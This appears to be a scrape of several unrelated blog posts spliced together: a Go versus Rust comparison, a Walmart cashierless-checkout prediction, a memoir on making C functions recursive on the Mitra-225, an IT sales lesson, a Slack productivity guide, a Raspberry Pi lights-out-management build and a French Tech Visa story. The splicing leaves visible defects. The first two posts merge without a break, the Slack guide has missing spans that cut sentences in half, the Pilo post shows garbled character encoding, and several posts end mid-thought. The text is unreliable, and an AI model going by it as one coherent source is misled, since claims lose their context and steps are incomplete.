<p>Go is a simple, small, and enjoyable language. It has some odd corners, but is mostly well-designed. It is incredibly fast to learn, and avoids any features which are not well-known in other languages.</p>
<p>Go is a very different language to Rust. Although both can vaguely be described as systems languages or 'replacements' for C, they have different goals and applications, styles of language design, and priorities. Garbage collection is a really huge differentiator. Having GC in Go makes the language much simpler and smaller, and easy to reason about. Not having GC in Rust makes it <em>really</em> fast (especially if you need guaranteed latency, not just high throughput), and enables features and programming patterns which are not possible in Go (or at least not without sacrificing performance).</p>
<p>Go is a compiled language with a well-implemented runtime. It is fast. Rust is also compiled, but has a much smaller runtime. It is <em>really fast</em>. Assuming no other constraints, I think the choice between using Go and Rust is a trade-off between a much shorter learning curve and simpler programs (which means faster development), versus Rust being really, really fast, and having a more expressive type system (which makes your programs safer and means faster debugging and error hunting).</p>

<p>TLDR: We predict Walmart acquiring a cashier-less tech startup like Grabango.</p>



<p><strong>Cashierless forced into mainstream</strong></p>



<p>COVID is also pushing retailers to try radical changes. Walmart is <a href="https://www.engadget.com/walmart-cashierless-store-164507722.html">testing cashierless checkout</a> by replacing people with <a href="https://www.walmart.com/cp/walmart-pay/3205993?irgwc=1&amp;sourceid=imp_3E8wRQQ4gxyOWlowUx0Mo36AUkiWV2w%3AP0Ak1o0&amp;veh=aff&amp;wmlspartner=imp_10078&amp;clickid=3E8wRQQ4gxyOWlowUx0Mo36AUkiWV2w%3AP0Ak1o0&amp;sharedid=engadget.com">self-checkout machines</a>.</p>



<p>Customers may not enjoy self-checkout so much. <a href="https://www.researchgate.net/publication/243973360_Customer_choice_of_self-service_technology_The_roles_of_situational_influences_and_past_experience">Researchers</a> found that more than 60% of shoppers who use self-checkout don’t use a shopping cart or basket, and they don’t buy fruits and vegetables. This suggests customers perceive cashiers as more efficient when it comes to buying a lot of items, or when we have fruits and veggies that are complicated to identify and weigh. Customers simply want the fastest way out, and that’s not always self-checkout.</p>



<p><em>“Unrecognized item in the bagging area.”</em></p>



<p><em>“Please wait for a store associate.”</em></p>



<p><em>“ID check required…”</em></p>



<p>Self-checkout machines are also some of the least functional machines many of us have used. In <a href="https://www.emerald.com/insight/content/doi/10.1108/09604520810871856/full/html">one survey </a>comparing ATM machines, gas station pumps, and airport check-in kiosks, self-checkout machines were overwhelmingly rated as the most troublesome to use.Over 43% of respondents disliked their frustrating design. <a href="https://www.forbes.com/sites/bryanpearson/2016/12/06/making-self-checkout-work-learning-from-albertsons/2/#5f061e606e25">Ikea, Albertsons, and CVS have actually removed self-checkout kiosks</a> in a bid to improve customer experience.</p>



<p>Walmart should take note. It’s been observed that customers blame the retailer when they face problems, not the machine’s manufacturer. Especially when we’re waiting for help from an associate that’s nowhere to be seen. The supposedly quicker experience suddenly becomes the most frustrating as customers feel cheated out of their expectation – it’s not <em>as </em>fast and the service seems incompetent. Not much different than going to the post office! But unlike the post office, we have choices on where to buy bananas.</p>



<p>Amazon, on the other hand, keeps investing in its “Just Walk Out” technology. We continue to <a href="https://seekingalpha.com/article/4336369-amazon-just-walk-out-just-in-time-for-post-covidminus-19-shopping-era">believe this will be an edge post-COVID</a>. New job postings as a proxy to investments into “Amazon Go” are relatively stable lately, but still down -43% in July compared to March.</p>

<p>Diving into specific areas of investment in cashierless, Amazon appears to be steadily investing in technology, while slowing down investments at stores. Major areas of decline in new job postings related to Amazon Go are in non-tech jobs: HR, Customer Service, and Project/Product/Program Management. On the other hand, Software/Hardware Developers and Solutions Architects are still sought after.</p>



<p><strong>New Amazon Go Job Postings by Job Category: July vs. March 2020</strong></p>



<figure><table><tbody><tr><td><strong>Job Category</strong></td><td><strong>2020-03</strong></td><td><strong>2020-07</strong></td><td><strong>% change</strong></td></tr><tr><td>Software Development</td><td>55</td><td>34</td><td>-38%</td></tr><tr><td>Human Resources</td><td>25</td><td>2</td><td>-92%</td></tr><tr><td>Project/Program/Product Management–Technical</td><td>21</td><td>11</td><td>-48%</td></tr><tr><td>Project/Program/Product Management–Non-Tech</td><td>16</td><td>6</td><td>-63%</td></tr><tr><td>Customer Service</td><td>14</td><td>5</td><td>-64%</td></tr><tr><td>Solutions Architect</td><td>13</td><td>18</td><td>38%</td></tr><tr><td>Corporate Operations</td><td>10</td><td>6</td><td>-40%</td></tr><tr><td>Buying, Planning, &amp; Instock Management</td><td>8</td><td>4</td><td>-50%</td></tr><tr><td>Operations, IT, &amp; Support Engineering</td><td>6</td><td>1</td><td>-83%</td></tr><tr><td>Marketing &amp; PR</td><td>5</td><td>1</td><td>-80%</td></tr><tr><td>Hardware Development</td><td>5</td><td>6</td><td>20%</td></tr></tbody></table></figure>



<p>It might be a while before “Amazon Go” stores ramp up staffing again. The need to serve impatient and now COVID-conscious workers at lunch time remains slim until downtown offices reopen. But the likelihood of its technology being implemented at strategic Whole Foods and other grocery store locations remains in our opinion quite high.</p>



<p><strong>Prediction: Walmart acquires ______ cashierless tech startup</strong></p>



<p>Walmart may never subscribe to <a href="https://techcrunch.com/2020/03/09/amazon-is-now-selling-its-cashierless-store-technology-to-other-retailers/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAANHqAS0iT5vUg1wK4uZcjGwftAuCGJ02ieTyDTpr6Scp0nb6QtrdF5Zn2Zby3Q0JPfpRF917qY0YV3gbLdZNwrsphQVupWqGsrXsppJkpfwi-3f0a9iYSS1cqP6hlKhJ6PS50kITh_25Kl-JSgXjW_n9g96fs1mi0wTdN4PM6D4w">Amazon’s cashierless tech</a> considering how much data they’d lose to their rival. They last refused to even consider an <a href="https://www.pymnts.com/amazon-technology/2020/amazon-pushes-its-cashierless-tech-to-enterprise-retailers/">open source version</a> of it. However, we strongly believe Walmart is still exploring ways to implement cashierless tech.</p>



<p>The safe way would be to sign up to a tech giant’s solution once mature. Perhaps when <a href="https://techcrunch.com/2018/06/14/microsoft-is-developing-its-own-cashierless-store-technology-says-report/">Microsoft finishes beta testing</a> with Kroger. Yet that would still imply sharing valuable customer shopping data with a cloud provider that also works with other rivals. Microsoft’s solutions architects would then in concept be able to share their “secrets” with others.</p>



<p>We believe there’s a high chance Walmart acquires one of the many <a href="https://thespoon.tech/here-is-a-list-of-cashierless-tech-companies-gunning-for-amazon-go/">tech startups trying to develop cashierless</a> for traditional businesses. <a href="https://grabango.com/about-us/">Grabango</a> is particularly interesting as shoppers can still pay using credit cards or cash at checkout, avoiding the need to scan items. This removes the need to setup an account with the retailer and opens the door for all Walmart shoppers to benefit from cashierless checkout.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="a3034387"><p><b>Memoir 1 - Recursive functions in C and the only time I was brilliant</b></p><p>Some time around 1988 I wanted to port UNIX to ES-1011, a hungarian clone of <a href="http://www.feb-patrimoine.com/english/mitra.htm">Mitra-225</a>. It was a 16-bit+ mini with an accumulator-based instruction set, and unlike its contemporary PDP-11, it had no hardware-supported stack.</p>
<p>Our ES-1011 ran OS <a href="https://k001.livejournal.com/397810.html?thread=2309106">MISS</a>, written by late <a href="https://zaitcev.livejournal.com/249725.html">Vladimir Butenko</a>, including a C compiler by <a href="https://www.linkedin.com/in/mark-venguerov-7a6a1/">Mark Venguerov</a>. Mark found it somewhat annoying implementing a stack. His prologue routine had 22 instructions and epilogue had something like 9. The K&amp;R C also had a non-trivial prologue function, called '.jsav' IIRC. But it wasn't as bad as having a word in memory work as a stack pointer on Mitra-225/ES-1011.</p>
<p>Because entering functions properly was so expensive, Mark made a decision not to make all functions recursive by default. Instead, those that needed to be recursive were marked with a reserved word "recursive". It was expected that not many needed it. The problem was how to find those that did and mark them. I didn't do that, but I think someone developed a program that searched for potential call loops (perhaps Ivan Bobrov or Sasha Ovsyankin did). Even so it was rather iffy to identify and tag recursion.</p>
<p>Before I started porting, I consulted with <a href="http://kotovnik.com/~avg/old_page/">Vadim Antonov</a>, who was basically King of Unix in USSR. His suggestion was to start with developing the ABI and calling convention. I don't remember if he pointed it out, or if I decided it myself, but Mark's explicit recursion was a non-starter. I began looking into the problem and had an idea.</p>
<p>Mitra-225 had an additional register, L, which was possible to read in userspace. I think it pointed at the word where the return address was saved. The instruction set featured a few rarely used addressing modes with L as an index register. Also, a procedure return instruction set L as a side effect, as I recall. Either way, I decided to use L as a frame pointer. I coded a somewhat unconventional prologue that recovered the return address and previous value of L, then re-set L so it continued to point into stack, and pushed return address there. It only took something like 9 instructions. The epilog was even smaller and it was basically RET. The code was compact and performant enough to allow all C functions to be recursive, as they should.</p>
<p>When I demonstrated the code to Mark, he looked at me for a long moment and said: "Where have you been before, Pete?"</p>
<p>By that time, he was busy with his 2nd C compiler, for 8086, and he never got back to retool the C for Mitra. And I burned out of porting UNIX for one reason or other. My diploma theses was porting MISS to PDP-11, ironically enough. So, nothing came out of my craftiness.</p>
<p>Next: <a href="http://zaitcev.mee.nu/memoir_002">Memoir 2</a>.</p>
<p>Update: There's a manual for Mitra-15 floating on the Internet, so I used it to refresh my memory somewhat. The L register is loaded from a global "section table" upon a procedure call (CLS: Call Section). This hardware support and traditional use make a reason why nobody came upon the obvious. But the procedure return (RTS) is recursion-friendly: it loads the return address from L+0 and the L from L+2.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><div><div itemprop="text"><p>I've worked in IT consulting for over 10 years in various roles. My current job includes meeting with prospects and discussing our IT services and how they fit into their business. This has been the first position I've held where I deal with a lot more of the business side and sales of IT Consulting.  </p>
<p>One thing has become very apparent in meetings with prospects. <strong>You have to treat every meeting as if this is your one and only shot. You cannot assume that this is just merely an introduction and later on in subsequent meetings you will be able to present more in depth information</strong>. If you have a visual presentation or any type a hard copy documentation you want to present, you have to present it in this meeting.  </p>
<p>A good example of this- A while ago a former colleague reached out to me and we discussed how my current employer and I could help them. Everything sounded great and initially we discussed a quick meeting to go over some of the very basics of how my firm is structured and our support options. I thought of this meeting as merely an introduction and the first step in the process of winning them over as a client. We had the meeting and I answered all their questions. A couple weeks went by and I hadn’t heard anything so I followed up with my former colleague. He informed me that they decided to go with another provider.  </p>
<p>At first I was a bit surprised because It seemed like a really good fit. There were a couple of outside forces that ultimately made them choose the other firm but one thing that he did mention is that the other provider delivered an entire presentation about their services and how they operate. This is when the alarm bells really went off and I ultimately felt like I squandered this opportunity. I have a presentation however I was planning on presenting that in a second meeting with my management team.  </p>
<p>After going through this and losing out on this potential client I have learned to treat every opportunity as if it’s my last and I have much better results with this mindset. There definitely have been times where I have had an initial introduction however we are going into it with the proper mindset and treating it as if it’s my one and only opportunity , It’s lead into second and possibly even additional meetings with other management and or teams in the organization.  </p>
<p>Consulting sales and MSP sales can a treacherous endeavor . Hope this helps give you some perspective or insight and helps someone along the way.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img src="https://www.arun.is/static/de17f375f5d105ef428e69b76eb5c530/cover.jpg" alt="feature"></p><section><div><p><span><span>Published August 20, 2020</span></span></p></div><div><h2 id="deep-work-in-the-time-of-covid">Deep work in the time of COVID</h2><p>Cal Newport wrote an excellent book called&nbsp;<em>Deep Work.&nbsp;</em>In it, he divides
professional work into deep and shallow work. Deep work can be described as
follows.</p><blockquote><p>“Professional activities performed in a state of distraction-free
concentration that push your cognitive capabilities to their limit. These
efforts create new value, improve your skill, and are hard to replicate.”</p></blockquote><p>Shallow work is the opposite.</p><blockquote><p>“Non-cognitively-demanding, logistical-style tasks, often performed while
distracted. These efforts tend to not create much new value in the world and
are easy to replicate.”</p></blockquote><p>For us knowledge workers, the value we provide is in the creative work we do,
such as coding, designing experiences, or building companies. Maximizing time
spent in a state of deep work can have an outsized impact on our unique
contributions.</p><p>The COVID-19 pandemic has accelerated the shift to remote work, a change that
will have lasting consequences. One is the replacement of traditional in-person
communication with digital tools like Slack.</p><p>This drastic change has already destabilized workdays and anecdotally, has
increased both the number of times people open up Slack during the workday and
the total amount of time spent using Slack. While utilizing tools like Slack is
critical to our jobs, most of us can safely categorize that usage as shallow
work.</p><p>Therefore, there is a real danger of spending significantly more time in the
shallows, reducing professional output and career progression.</p><h2 id="slack-and-its-immense-flexibility">Slack, and its immense flexibility</h2><p><a href="https://slack.com/">Slack</a>&nbsp;is an incredibly powerful tool that is undoubtedly
crucial to the functioning of many businesses today. That power stems from its
sheer flexibility. It’s a single source of truth, unlike email, where knowledge
is spread out over inboxes. It supports both real-time and asynchronous
communication. It plugs into other services, making it a hub for operations. It
grows with companies as they expand. There isn’t one right way to use Slack,
which is precisely one of its biggest strengths. Join different Slack teams, and
you’ll see how differently they can function.</p><h2 id="the-achilles-heel-of-general-purpose-technology">The Achilles heel of General-purpose technology</h2><p>Slack’s flexibility is also its biggest weakness. Out of the box, it doesn’t
force a specific way of using it. Why is that a bad thing? Let’s look at an
example.</p><p>A traditional tool like a saw is designed for a particular purpose. When I need
to cut something, I reach for my saw and use it as intended. When I don’t need
it, it sits among my other tools.</p><p>The story is different with multi-purpose tools like the personal computer or
the smartphone. Most of us purchased a smartphone wanting to keep up with
family, navigate around town, or take photographs. However, over time, we’ve
downloaded some games or social networking apps. We’ve started to carry our
phone into the bathroom. What began as a pure utility, has become a source of
distraction.</p><p>The only way to fight this is by being deliberate and not letting our whims
decide how we use our tools. With the smartphone, that means strictly limiting
which apps we install and when we pull out our phone. It means building a strict
separation between work and play.</p><p>The same is true with Slack and other communication tools. If we aren’t
deliberate about what value we want to receive from these tools, our impulses
will decide.</p><p>Slack isn’t immune from dopamine-fueled addiction that is common with social
media services and games. The variable reward (variable both in timing and in
the content of the incoming messages) that we receive when opening up Slack can
lead to&nbsp;<a href="https://en.wikipedia.org/wiki/Compulsion_loop">compulsion loops</a>. I’ve
observed myself opening up Slack to kill time just like I would do by playing a
mobile game or checking a social media feed.</p><h2 id="the-deep-work-guide-to-slack">The deep work guide to Slack</h2><p>Here’s my guide to how knowledge workers today can use Slack while being more
productive and preventing it from taking over their lives.</p><p><strong>Caveat:</strong>&nbsp;I’m assuming here that you are a knowledge worker whose profession
doesn’t require timely responses to incoming messages. If you are a firefighter
or customer service representative, then most of what I’m saying here probably
won’t apply to you. Also, if you are in a role that requires significant
coordination or management, then some of what I’m saying here may ring true, but
some of it may not.</p><h3 id="have-a-separate-todo-list">Have a separate todo list</h3><p>We can easily run our days from Slack, treating it as a todo list. Slack shares
that trap with other communication tools like email. Using inboxes as todo lists
presents a high likelihood of working on shallow work while neglecting the deep,
impactful work.</p><p>A necessary part of being productive on Slack is having a separate todo list and
a productivity system for organizing our deep work. It can be as simple as a
sticky note or a text file. Whatever method you choose, make sure it is free of
distractions.</p><h3 id="batching-and-time-boxing">Batching and time boxing</h3><p>To prevent compulsion loops, scheduling Slack usage. Instead of filling the
margins between meetings and working sessions, schedule it just like a meeting.
Prevent Slack from interrupting deep work and remove the possibility of
introducing&nbsp;<a href="https://memory.ai/timely-blog/attention-residue">attention residue</a>&nbsp;that
can severely slow you down.</p><p>The dedicated time box also creates a space to process slack messages properly.
If you check Slack in the 5 minutes between two meetings, you likely won’t have
enough time to address the messages and will have to come back to them anyway.</p><p>I schedule time twice a day to check Slack and email 30 minutes at a time. Do
what works best for you.</p><h3 id="pull-not-push">Pull, not push</h3><p>The second behavior I find useful is using Slack with a pull strategy.</p><p>Traditional telephones are a form of push communication. When the sender wants
to relay a message, they decide when to contact the receiver and interrupt
whatever they happen to be doing at the moment.</p><p>Mail, on the other hand, is a pull system. Senders can send letters at any time.
However, the receiver chooses when to read their mail.</p><p>For most of us, the advantage of instant contact with push communication doesn’t
justify the cost of interruptions and distractions. So, use Slack with a pull
strategy.</p><p>For this to work, you need to remove the possibility of interruptions and
increase the friction of checking Slack. Here are the steps I follow:</p><ol><li>Use Slack only in the browser on a computer. If you can’t do that, quit the
app between uses or, better yet, uninstall it. I find that having the app
open can quickly shift me into a casual browsing mode without even realizing
it. Also, don’t use the mobile application unless you need access everywhere
you go.</li><li>Remove notifications and icon badges — mute sounds. Since you’ll be checking
Slack regularly at predetermined times, sounds and notifications no longer
serve any purpose. If you are concerned about being available during an
emergency, then provide an alternate means of contact like your mobile
number.</li></ol><p><span>

    </span></p><p>This step does have the disadvantage of making channels and direct messages harder to find when composing a new message. However, there is the channel browser for browsing all channels. Furthermore, the shortcuts&nbsp;<span>⌘ + K</span> and <span>⌘ + T</span> open up a spotlight-style search bar to jump to nearly anything within Slack.</p><p>To take it further, I reduce the visual prominence of the badges denoting unread
messages. You can do that by customizing your Slack theme and turning the
usually red dots a more muted color. I use my own theme based on the color
palette used on this site.</p><p><span><iframe src="https://player.vimeo.com/video/449531948?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><p>Use my theme by copying the code below into Slack under

visual clutter within message threads. I find this helps me process messages in
the order they arrive instead of letting visuals attract my eye.</p><p>In <code>Preferences &gt; Messages and Media</code>, switch the theme from Clean to Compact,
which removes profile photos and makes timestamps more prominent.</p><p>Also, uncheck all settings related to inline media and links, which hides them
behind a click.</p><p><span><iframe src="https://player.vimeo.com/video/449199248?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><h3 id="read-messages-in-a-queue">Read messages in a queue</h3><p>This last step is the most important. To reduce the amount of cognitive overhead

received.</p><p>Doing this makes it dead simple to process a large number of messages and
prevents the scenario where some messages lay unanswered while other newer ones
are processed.</p><p>To consume Slack messages as a queue, the first step is to make sure that the

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="https://zach.bloomqu.ist/assets/pilo-naked.jpg" alt="Pilo board before final tape-up"> <small>The completed Pilo controller, before final installation. The USB capture card and Arduino Nano USB serial are soldered to the underside of the 3B+.</small></p> <p>Like many geeks, I have a â€œhome serverâ€� made from off-the-shelf, consumer-grade PC parts, from which I run my weekend programming projects, game servers for friends, this website, and so on. Recently, I had a power event at the house that caused the server to reboot. When the power came back on, the server booted, but it was stuck at the boot screen waiting for me to enter the disk decryption passphrase!</p> <p>Luckily, I was at home and asleep at the time. Once I woke up and realized something was amiss, I was able to plug in a keyboard and enter the passphrase. But this event got me thinking - what if I wasnâ€™t home at the time? What if I was in another country? What if someday, I move this server outside of my house and need to regularly access the physical screen and keyboard?</p> <p>In the â€œreal serverâ€� world, the solution to this is known as <a href="https://en.wikipedia.org/wiki/Out-of-band_management">â€œlights-out managementâ€� (LOM)</a>. Every major server manufacturer has their own flavor of this, such as HPâ€™s iLO (Integrated Lights-Out). There are even industry standards like <a href="https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface">IPMI</a> that define common interfaces for LOM implementations. Commonly supported functions for LOM systems include:</p> <ul> <li>Controlling keyboard and mouse input</li> <li>Controlling power button status (so you can restart, shutdown, force offâ€¦)</li> <li>Seeing the raw video output from the motherboard (even pre-boot - even for BIOS)</li> <li>Mounting ISOs as disks</li> </ul> <p>I decided to make my own Raspberry Pi-based LOM that can do some of these things, to help decrease my stress next time I leave my house for an extended period of time. Iâ€™d like to introduce Pilo - â€œPi Lights-Outâ€�.</p> <blockquote> <p>Note: This post describes how I arrived at the final design of this system. If you just want the instructions for setting this up on your own, start reading at â€œTutorialâ€�.</p> </blockquote> <h2 id="building-the-keyboard-controller">Building the Keyboard Controller</h2> <p>When I started looking for ways to use my Pi to send keyboard commands to a computer, the problem I discovered was that all of the existing methods rely on <a href="http://www.isticktoit.net/?p=1383">using the Raspberry Pi Zero as a USB host</a>, which disables using the onboard USB port for other purposes. Additionally, this method does not work on other boards, like the Raspberry Pi 3B+. This was problematic, because I wanted to use the 3B+ due to the on-board Ethernet - that, and the fact that I had one kicking around from a previous <a href="https://pi-hole.net/">Pi-hole</a> deployment.</p> <p>A more suitable solution would be to emulate a keyboard via the GPIO pins of the Pi. This would theoretically not affect existing USB devices, and could be used on any model of Pi, not just the Pi Zero. So I started looked into trying to <a href="http://www.jargon.net/jargonfile/b/bitbang.html">â€œbit-bangâ€�</a> the USB Human Interface Device protocol via the Piâ€™s GPIO pins.</p> <p>I pretty quickly hit a dead end with that. There are <a href="https://raspberrypi.stackexchange.com/q/82850/100317">many</a>, <a href="https://www.element14.com/community/thread/38228/l/raspberry-pi-usb-output-from-gpio">many</a> existing discussions on the web about bit-banging the USB protocol on the Pi. The consensus seems to be that the Raspberry Piâ€™s GPIO is too slow to emulate USB, and even if it <em>could</em> output bits fast enough to act as a USB device, the implementation would be extremely buggy because of the non-real-time nature of the Linux OS (<a href="https://raspberrypi.stackexchange.com/a/87865/100317">read more</a>).</p> <p>But USB isnâ€™t the only way to send keypresses to a computer - almost a decade before the USB standard was a twinkle in Compaqâ€™s eye, IBM was using the <a href="https://en.wikipedia.org/wiki/PS/2_port">PS/2</a> standard (not to be confused with the <a href="https://en.wikipedia.org/wiki/PlayStation_2">PS2</a>) to connect mice and keyboards to PCs. Itâ€™s still not feasible to use the Pi to bit-bang the PS/2 protocol, but we can use an Arduino as a daughterboard, and the <a href="https://github.com/Harvie/ps2dev"><code>ps2dev</code></a> library can handle the nitty-gritty of the serial protocol for PS/2.</p> <p><img src="https://zach.bloomqu.ist/assets/pilo-pin-jam.jpg" alt="Left: Arduino soldered up. Right: Breadboard jumpers jammed into the PS/2 port"></p> <p>So thatâ€™s what I did. The Arduino Nano pictured on the left is plugged directly into the PS/2 combo port on the back of the motherboard (ignore the unused 5V wire, red). Originally, I planned on cutting the end off of a PS/2 cable and making it all nice, but the Goodwill near me didnâ€™t have any PS/2 junk and it turns out that breadboard wires just fit oh-so-snugly into the DIN holes. So this is how itâ€™s gonna be.</p> <p>The Arduino Nano is flashed with a <a href="https://create.arduino.cc/editor/flotwig__/093ababe-c724-476f-aeb8-a76b239bf192/preview">short program</a> that makes it act as a dumb pipe which blindly shuttles bytes from the Arduinoâ€™s USB serial port to the PS/2 connection on the motherboard. This means that all of the logic for which keyboard commands should be sent has to be written on the Pi-side, which is nice, because it means that we should never have to re-flash the Arduino to update some keyboard logic.</p> <p>Note that currently, Pilo is only built to control keyboard input, since it is oriented towards server use. It would be possible to add PS/2 mouse output with no additional hardware, just 2 or 3 wires for PS/2 mouse CLK, DATA, and GND (unless using combo port). The <a href="https://github.com/Harvie/ps2dev"><code>ps2dev</code></a> library contains functions for mouse control as well.</p> <h3 id="power-control-via-ps2">Power Control via PS/2</h3> <p>Originally, I thought I was going to have to wire a relay to the motherboardâ€™s RESET pin to allow Pilo to control the computerâ€™s power. This is the approach that <a href="https://github.com/Fmstrat/diy-ipmi"><code>diy-ipmi</code></a>, another similar project, uses. However, while researching the keyboard controller, I rediscovered a long-lost secret of the PS/2 standard: the â€œACPI keysâ€�. ACPI, or the Advanced Configuration and Power Interface, is a set of power management standards for PCs. The PS/2 standards define <code>Power</code>, <a href="https://ux.stackexchange.com/q/83200/117790"><code>WakeUp</code></a>, and <code>Sleep</code> key scancodes that can be used to control the power status of the PC - just like the power button on the front of the box, a short-press of the <code>Power</code> key requests the OS to shutdown. However, on my motherboard, a long-press of <code>Power</code> does <em>NOT</em> seem to force the power off.</p> <p><img src="https://zach.bloomqu.ist/assets/pilo-bios-s5.png" alt="A screenshot of the BIOS with the ACPI S5 Wake-On-Keyboard option selected"></p> <p>Almost all BIOS support using the ACPI keys to power the system on from a powered down state. Above is what the option looks like in my BIOS (in ACPI, the powered-off state is known as â€œS5â€�). With this option enabled, sending the <code>Power</code> scancode will boot the computer up from an off state.</p> <p>So, now the Arduino has two responsibilities in Pilo: to send regular keypresses to the computer, and to send power commands to the computer. This saves us from having to install a relay for the motherboardâ€™s RESET pin.</p> <h2 id="capturing-video-output">Capturing Video Output</h2> <p>My server has a GPU with HDMI output, so I decided to use a USB HDMI capture card to get the video feed for Pilo. I found one on <a href="https://smile.amazon.com/gp/product/B08BZ52Q65/">Amazon for about $15</a>. When connected to the Pi, it acts as a regular USB webcam, available under <code>/dev/videoX</code>.</p> <p>Before this project, I had no experience with streaming video over the web. I decided to use <a href="https://www.linux-projects.org/uv4l/"><code>uv4l</code></a> (â€œUserspace Video4Linuxâ€�)â€™s <a href="https://www.linux-projects.org/home/documentation/uv4l-server/"><code>uv4l-server</code></a> component to set up an HTTP video server. <code>uv4l</code> makes it easy to set up a simple MJPEG stream, which is the goofiest possible video stream - each frame of the stream is a full JPEG image, sent to you in real time. As you can imagine, itâ€™s not the lightest on bandwidth, but it is easy to embed - all web browsers support embedding it in an <code>&lt;img&gt;</code> tag: <code>&lt;img src="/stream.mjpeg"/&gt;</code></p> <p>I configured the <code>uv4l-server</code> to only listen on <code>localhost</code>, with the idea that I could reverse-proxy connections to the video stream to provide security.</p> <h2 id="creating-the-application">Creating the application</h2> <p>For the Pilo interface, I decided to go with a web app, instead of something like VNC, or the actual IPMI protocol. This was mostly due to my background in web development, and the fact that the app can be accessed with a web browser, something every computer has installed. Here is a short video showing the completed Pilo app in action:</p> <video controls="" autoplay="" muted="" loop="" src="https://zach.bloomqu.ist/assets/pilo-demo.webm" type="video/webm"> <p>Your browser doesn't support WEBMs. <a href="https://zach.bloomqu.ist/assets/pilo-demo.webm">Download the video instead.</a></p> </video> <p>You can find the <a href="https://github.com/flotwig/pilo">GitHub repo for Pilo here</a>. It consists of two major components:</p> <ul> <li><a href="https://github.com/flotwig/pilo/tree/master/frontend"><code>frontend</code></a> - uses vanilla HTML/CSS/JS to display the interface, translate keypresses, and communicate with the server via websockets</li> <li><a href="https://github.com/flotwig/pilo/tree/master/server"><code>server</code></a> - the HTTP server, written in Node.js. Authenticates requests using HTTP basic auth, communicates with the keyboard controller via the <code>serialport</code> library, and manages reverse-proxying of the <a href="https://www.linux-projects.org/home/documentation/uv4l-server/"><code>uv4l-server</code></a> video stream</li> </ul> <p>There are also end-to-end tests in the <a href="https://github.com/flotwig/pilo/tree/master/e2e"><code>e2e</code></a> folder which use <a href="https://cypress.io/">Cypress</a> to test the application in real web browsers. This runs against Firefox and Chrome on every commit to CI via a <a href="https://github.com/flotwig/pilo/blob/master/.github/workflows/test.yml">GitHub Actions workflow</a>.</p> <p>The <a href="https://github.com/flotwig/pilo#pilo"><code>README</code></a> contains information on building and testing the project if you are interested in contributing. Built packages are also published to <code>npm</code> for production use.</p> <h2 id="packaging-the-pilo">Packaging the Pilo</h2> <p>One of my goals when building Pilo was to make it small enough to fit inside of my server case. Check out these photos to see how it fit in:</p> <p><img src="https://zach.bloomqu.ist/assets/pilo-in-server.jpg" alt="Left: Before Pilo.

<p>Three years ago, things were different. I didn’t know any French, I didn’t have a business, and I didn’t have a job.</p>



<p>I had just quit a great job in Singapore to start my own company. My partner was starting her master’s in Paris and told me to come stay. So I packed up everything, shipped some of it to my mom in New York, and hopped on a flight to CDG.</p>



<figure><img src="http://christianpetroske.com/wp-content/uploads/2020/08/paris.png" alt="" srcset="https://christianpetroske.com/wp-content/uploads/2020/08/paris.png 878w, https://christianpetroske.com/wp-content/uploads/2020/08/paris-300x74.png 300w, https://christianpetroske.com/wp-content/uploads/2020/08/paris-768x191.png 768w" sizes="(max-width: 878px) 100vw, 878px"></figure>



<p>Around this time, French President Macron released an iconic video as part of the <a rel="noreferrer noopener" href="https://makeourplanetgreatagain.fr/en/business" target="_blank">Make Our Planet Great Again campaign</a>. He told scientists, researchers, and innovators from around the world to come to France. I was supposed to be an innovator now. My ears perked up.</p>



<p>“Your new homeland” it said. It continued: “Entrepreneurs and skilled employees from all over the world, France is made for you!”</p>



<p>Made for me, huh? Okay, I’ll bite.</p>



<p>I bit.</p>



<p>A few clicks later I found myself reading about <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/" target="_blank">the French Tech Visa</a>, a visa scheme that awards founders of tech companies a visa for four years to live and start their business in France.</p>



<p>This seemed like the ultimate three-birds-one-stone: I would get to start my company, be with my partner, and live in effing Paris—learning French, discussing philosophy, eating croissants, whatever else people do in Paris. Life sorted for the next few years! Right?</p>



<p>In retrospect, I was right about the big stuff: starting the company, living with my partner, learning French, and the croissants (oh oui). </p>



<p>But it did not come easy. I learned a ton. I am incredibly grateful that it worked out. There were many moments when it almost didn’t. Through a combination of luck, hustle, privilege, and the kindness of others, I am where I am today: running my own business, living in France with my partner, speaking French, eating croissants, and looking back on it all muttering <em>putain</em> in happy disbelief.</p>



<p>Looking back too, I’m struck by how little information there was out there for people in my situation. I kept finding out critical information through chance conversations—and I’d done my research. I started thinking that the whole process should be a lot more transparent.</p>



<p>I’ve since had conversations with several people who were considering this path. So I decided to write down some of it to help others who are thinking about coming to France to start their company.</p>



<p>If that’s you, here are the basics of what you need to know. The challenge generally breaks down into 1) the visa, 2) the business, and 3) the language and culture.</p>



<p>(If you’re really serious about this, I’m writing a complete guide to the French Tech Visa which <a href="https://gum.co/SRUhE" target="_blank" rel="noreferrer noopener">you can preorder here</a>.)</p>



<h2>First: the visa</h2>



<p>There are three different French Tech visas: for <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-founders/" target="_blank">founders</a>, <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-employees/" target="_blank">employees</a>, and <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-les-investors/" target="_blank">investors</a>. I have the one for founders. That’s the one I know the most about, so it’s the one I focus on here.</p>



<p>The first step to getting the French Tech Visa for founders is to look at this list of incubators.</p>



